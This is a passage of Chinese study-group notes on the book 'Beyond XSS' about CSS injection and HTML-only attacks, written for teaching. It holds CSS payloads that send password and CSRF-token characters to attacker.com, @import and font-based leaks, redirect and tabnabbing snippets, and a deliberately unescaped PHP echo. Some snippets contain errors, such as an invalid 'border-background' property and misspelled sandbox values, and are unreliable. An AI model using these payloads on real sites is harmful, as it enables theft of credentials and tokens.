---
title: 【XSS】不觸發 Javascript 的 XSS 攻擊
tags: ['XSS', 'Web Security']
sidebar_label: 【XSS】不觸發 Javascript 的 XSS 攻擊
sidebar_position: 1
---

# 【XSS】不觸發 Javascript 的 XSS 攻擊

:::note
這邊是《Beyond XSS：探索網頁前端資安宇宙》第三章讀書會筆記。
這一樓還在蓋，請稍後再來。
:::

# 3-4：只用 CSS 也能攻擊？CSS Injection 基礎篇

## How：駭客透過 CSS 的哪些特性來進行攻擊？

- CSS Selector：透過 CSS Selector 來選取特定的元素
- image url：可以透過 image url 發送 request 到攻擊者的 server

```css
input[name='password'][value^='a'] {
  background: url('http://attacker.com/?q=a');
}
```

### Recap：幫我白話翻譯一下這段 CSS 是什麼意思？

Q1：

```css
input[name='password'][value^='a'] {
  background: url('http://attacker.com/?q=a');
}
```

A1：選取 name 是 password 且 value 開頭是 a 的 input 欄位，然後將背景圖片設定為 attacker.com/?q=a

## 側錄攻擊(Side Channel Attack)

假設現在有一個 input 欄位

```html
<input name="secret" value="abc123" />
```

可以透過 CSS 的 attribute selector 來偷取 input 欄位的值

```css
input[name='secret'][value^='a'] {
  background: url('http://attacker.com/?q=a');
}

input[name='secret'][value^='b'] {
  background: url('http://attacker.com/?q=b');
}

input[name='secret'][value^='c'] {
  background: url('http://attacker.com/?q=c');
}
```

2. 偷 hidden input -- 以 csrf token 為例

```html
<form action="/action">
  <input name="username" />
  <input type="submit" />
  <input type="hidden" name="csrf-token" value="abc123" />
</form>
```

```css
meta {
  display: block;
}

input[name='csrf-token'][value^='a'] + input {
  background: url('http://attacker.com/?q=a');
}

form:has(meta[name='csrf-token'][content^='a']) + input {
  background: url('http://attacker.com/?q=a');
}
```

我要選 name 是 csrf-token 且 value 開頭是 a 的 meta tag，然後找到這個 meta tag 的下一個 input 欄位，然後偷取它的值。

3. 偷 meta tag：我們常在 meta 裏面放一些重要的資訊

```html
<meta name="csrf-token" content="abc123" />
```

## react-router 攻擊

```html
<iframe srcdoc="
  iframe /home below<br>
  <iframe name=defaultView src=/home></iframe><br>
  iframe /home above<br>
  <style>
    a[href^="/post/0"] {
      background: url(//myserver?c=0);
    }

    a[href^="/post/1"] {
      background: url(//myserver?c=1);
    }

  </style>

  react app below<br>
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

## 章節 QA：

1. 請問側錄攻擊(Side Channel Attack)是利用 CSS 的哪個特性來實現的？

   - [ ] CSS 的 attribute selector
   - [ ] CSS 的 pseudo-class
   - [ ] CSS 的 pseudo-element
   - [ ] CSS 的 combinator

2. 什麼是 csrf？

   - [ ] Cross-Site Request Forgery
   - [ ] Cross-Site Scripting
   - [ ] Cross-Origin Resource Sharing
   - [ ] Content Security Policy

# 3-5：CSS Injection 進階篇

## 如何在保持連線的情況下，透過 CSS 偷取敏感資訊？

```css
@import url('http://attacker.com/payload?len=1');
@import url('http://attacker.com/payload?len=2');
@import url('http://attacker.com/payload?len=3');
@import url('http://attacker.com/payload?len=4');
@import url('http://attacker.com/payload?len=5');
```

載入時保持連線，但是首先只有第一個 import 會回傳 response，當偷到第一個字元後，就可以透過第二個 import 來偷取第二個字元，以此類推。

```css
input[name='password'][value^='a'] {
  background: url('http://attacker.com/?q=a');
}

input[name='password'][value^='b'] {
  background: url('http://attacker.com/?q=b');
}
```

## 一次偷一個也太慢了吧

```css
input[name='password'][value^='a'] {
  background: url('http://attacker.com/?q=a');
}

input[name='password'][value^='b'] {
  background: url('http://attacker.com/?q=b');
}

input[name='password'][value$='a'] {
  border-background: url('http://attacker.com/?suffix=a');
}

input[name='password'][value$='b'] {
  border-background: url('http://attacker.com/?suffix=b');
}
```

## Unicode Range

```html
<!DOCTYPE html>
<html>
  <body>
    <style>
      @font-face {
        font-family: 'f1';
        src: url(https://myserver.com?q=1);
        unicode-range: U+31;
      }

      @font-face {
        font-family: 'f2';
        src: url(https://myserver.com?q=2);
        unicode-range: U+32;
      }

      @font-face {
        font-family: 'f3';
        src: url(https://myserver.com?q=3);
        unicode-range: U+33;
      }

      @font-face {
        font-family: 'fa';
        src: url(https://myserver.com?q=a);
        unicode-range: U+61;
      }

      @font-face {
        font-family: 'fb';
        src: url(https://myserver.com?q=b);
        unicode-range: U+62;
      }

      @font-face {
        font-family: 'fc';
        src: url(https://myserver.com?q=c);
        unicode-range: U+63;
      }

      div {
        font-size: 4em;
        font-family: f1, f2, f3, fa, fb, fc;
      }
    </style>
    Secret:
    <div>ca31a</div>
  </body>
</html>
```

## 字體高度差異 + first-line + scrollbar

## 章節 QA：

Q1: 用一句話解釋 CSS Injection 的原理是什麼？

- 改變網頁的外觀： 攻擊者可以通過 CSS 程式碼來修改網頁的樣式，例如改變字體、顏色、佈局等，甚至隱藏或顯示某些元素。
- 竊取使用者資訊： 攻擊者可以利用 CSS 的某些特性來獲取網頁上的敏感資訊，例如使用者名稱、密碼、Cookie 等。
- 執行其他攻擊： 在某些情況下，CSS Injection 可以與其他攻擊手法結合，例如 XSS（跨站腳本攻擊），造成更嚴重的危害。

Q2: 要如何防範 CSS Injection？

- 過濾輸入： 在接收使用者輸入時，應該對其進行過濾，避免惡意的 CSS 程式碼進入網頁。
- 使用 Content Security Policy（CSP）： CSP 是一種瀏覽器標頭，可以限制網頁中載入的資源，包括 CSS 檔案。通過設置 CSP，可以有效防範 CSS Injection。

# 3-6：就算只有 HTML 也能攻擊？

## Reverse Tabnabbing（反向標籤劫持）

```html
<a href="https://blog.huli.tw" target="_blank">My Blog</a>
```

在使用者進入新分頁後，可以透過 window.opener 來修改原本的視窗。

```javascript
window.opener.location = 'https://attacker.com';
```

如果沒有加上 rel='noopener noreferrer'，當使用者點擊連結後，攻擊者可以透過 window.opener 來操作原本的視窗。

## 透過 meta 標籤來重新導向

常見的 meta 標籤

```html
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="description" content="這篇文章會提到..." />
<meta property="og:title" content="這是文章的標題" />
<meta property="og:description" content="這是文章的描述" />
<meta property="og:image" content="https://blog.huli.tw/cover.jpg" />
```

透過 meta 標籤來重新導向

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com" />
```

## 透過 iframe 來重新導向

```html
<iframe
  src="https://attacker.com"
  sandbox="allow-script allow-top-naviagetion"
></iframe>
```

預設的 iframe 是不允許重新導向的，但是可以透過 sandbox 來開啟這個功能。

```javascript
// top 指的是最上層的視窗
top.location = 'https://attacker.com';
```

## 透過表單進行攻擊

Chrome 的特性：

- visibility:Hidden =>不會自動填入
- OPAcity: 0% =>會被視為表單元素

透過自動填入，可以在頁面上隱藏一個表單，然後產生一個樣式一樣的按鈕，當使用者點擊按鈕時，就會觸發表單的提交。

## Dangling Markup injection

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta
      http-equiv="Content-Security-Policy"
      content="script-src 'none'; style-src 'none'; form-action 'none'; frame-src 'none';"
    />
  </head>
  <body>
    <div>
      Hello,
      <?php echo $_GET['q']; ?>
      <div>Your account balance is: 1337</div>
      <footer><img src="footer.png" /></footer>
    </div>
  </body>
</html>
```

可以透過嵌入 `<img src="` 的方式，讓下面的`<div>` 也成為 href 的一部分。

## 章節 QA：

1. 什麼是 Reverse Tabnabbing？
2. 可以透過 HTML 的哪些元素來進行攻擊？
